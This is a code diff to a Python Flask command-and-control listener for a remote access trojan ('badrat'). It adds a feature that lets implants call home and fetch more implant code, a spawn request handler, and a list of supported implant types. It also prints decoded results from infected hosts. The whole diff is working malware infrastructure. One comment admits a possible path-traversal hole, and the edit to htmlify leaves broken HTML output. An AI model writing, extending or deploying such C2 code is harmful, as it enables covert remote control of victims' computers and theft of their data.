@@ -15,6 +15,8 @@ ENDC = '\033[0m'
 UNDERLINE = '\033[4m'
 
 port=8080
+supported_types = ["c", "py", "js", "ps1", "hta"]
+
 # I should probably make a dict of dicts...
 commands = {}
 rats = {}
@@ -27,18 +29,14 @@ def htmlify(data):
     html += "<body>\n"
     html += "<b>\n"
     html2 = "</b>\n"
-    html2 = "</body></html>\n"
+    html2 = "</body>\n"
+    html2 = "</html>\n"
     return(html + data + "\n" + html2)
-
-# Page sent to "unauthorized" users of the http listener
-def default_page():
-    message = "WTF who are you go away"
-    return(htmlify(message))
 
 # Print colors according to the rat type
 def colors(value):
     BOLD = '\033[1m'
-    c = '\033[91m'  # Red
+    c = '\033[91m'    # Red
     py = '\033[92m'   # Green
     js = '\033[93m'   # Yellow
     ps1 = '\033[94m'  # Blue
@@ -56,6 +54,21 @@ def colors(value):
         return(c + value + ENDC)
     else:
         return(UNDERLINE + value + ENDC)
+
+# Page sent to "unauthorized" users of the http listener
+def default_page():
+    message = "WTF who are you go away"
+    return(htmlify(message))
+
+# Allow rats to call home and request more ratcode of their own type
+def send_ratcode(ratID):
+    if(not rats[ratID]):
+        return(default_page())
+    else:
+        # Careful for path traversal vuln... This code may not be 100 percent safe
+        with open(os.getcwd() + "/rats/badrat." + types[ratID], 'r') as fd:
+            print("[*] sending ratcode to " + colors(ratID))
+            return(fd.read())
 
 def serve_server(port=8080):
     app = Flask(__name__)
@@ -80,6 +93,8 @@ def serve_server(port=8080):
         try:
             ratID = str(post_dict['id'])
             ratType = str(post_dict['type'])
+            if(ratType not in supported_types):
+                ratType = "?"
             username = str(post_dict['un'])
         except:
             print("[!] Failed to grab id, type, or user param from post request")
@@ -98,6 +113,10 @@ def serve_server(port=8080):
         if("retval" in post_dict.keys()):
             print("\nResults from rat " + colors(str(post_dict['id'])) + "\n")
             print(base64.b64decode(post_dict['retval']).decode('utf-8'))
+
+        # Spawn from HTTP page
+        if("req" in post_dict.keys() and post_dict['req'] == "spawn"):
+            return(send_ratcode(ratID))
 
         return(htmlify(json.dumps({"cmnd": commands[ratID]})))
 
